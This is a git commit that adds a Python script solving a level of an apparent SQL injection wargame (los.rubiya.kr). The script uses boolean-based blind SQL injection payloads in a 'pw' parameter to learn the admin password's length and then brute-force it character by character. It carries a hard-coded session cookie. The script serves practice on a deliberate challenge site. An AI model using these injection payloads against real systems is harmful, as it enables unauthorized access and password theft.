ee4faa8c1d397c2c5293b81d7235d92368e471a7
thisisyoobi <thisisyoobi@gmail.com>
2022-03-09 21:55:56 +0900

    start LOS

---
+++ LOS/04_orc.py
@@ -0,0 +1,35 @@
+import requests
+import string
+
+header = {"Cookie": "PHPSESSID=93bvl3l66u57rtt993gi4tn90d;"}
+url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
+string_data = string.digits + string.ascii_letters
+
+print(string_data)
+
+password = ""
+password_len = 1
+
+# find password length
+while True:
+    data = "?pw=' or id='admin' and length(pw)={}%23".format(str(password_len))
+    response = requests.get(url + data, headers=header)
+    if response.text.find("Hello admin") != -1:
+        break
+    print("[*] Finding... : " + str(password_len))
+    password_len += 1
+print("[+] Get Password Length : " + str(password_len))
+
+# find password
+for idx in range(1, password_len + 1):
+    for i in string_data:
+        # data = "?pw=' or id='admin' and pw like '{}{}%".format(password,i)
+        # data = "?pw=' or id='admin' and ord(substr(pw,{},1))={}%23".format(idx,ord(i))
+        data = "?pw=' or id='admin' and substr(pw,{},1)={}%23".format(idx,i)
+        print(data)
+        response = requests.get(url + data, headers=header)
+        if response.text.find("Hello admin") != -1:
+            password = password + i
+            print("[*] Finding... : " + password)
+            break
+print("[+] Found Password : " + password)
